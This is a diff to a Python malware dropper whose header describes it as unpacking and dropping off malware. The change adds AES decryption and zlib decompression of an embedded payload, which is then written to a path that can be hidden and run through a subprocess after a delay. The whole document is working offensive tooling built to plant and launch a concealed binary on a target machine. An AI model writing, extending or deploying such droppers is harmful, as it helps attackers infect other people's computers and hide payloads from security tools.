@@ -2,23 +2,27 @@
 # Author: Pure-L0G1C
 # Description: Unpacks and drops off malware
 
+import zlib 
 from time import sleep
+from lib.file import File
+from lib.aes import decrypt
+from lib.pathfinder import Finder
 
 class Dropper(object):
 
-    def __init__(self, name, binary, delay, hide=False):
-        self.binary = binary
-        self.delay = delay
+    def __init__(self, name, binary, key, delay, hide=False):
+        self.key = key
+        self.path = None
         self.name = name
         self.hide = hide
-        self.path = None
+        self.delay = delay
+        self.binary = binary
 
     def unpack(self):
-        from lib.file import File
-        from lib.pathfinder import Finder
         self.path = Finder.find() + self.name if self.hide else self.name
         print('Path:', self.path)
-        File.write(self.path, self.binary)
+        data = zlib.decompress(decrypt(self.binary, self.key))
+        File.write(self.path, data)
 
     def execute(self):
         from subprocess import Popen
@@ -31,4 +35,4 @@ class Dropper(object):
         self.execute()
 
 if __name__ == '__main__':
-    Dropper(data_name, data_binary, data_delay, data_hide).start()
+    Dropper(data_name, data_binary, data_key, data_delay, data_hide).start()
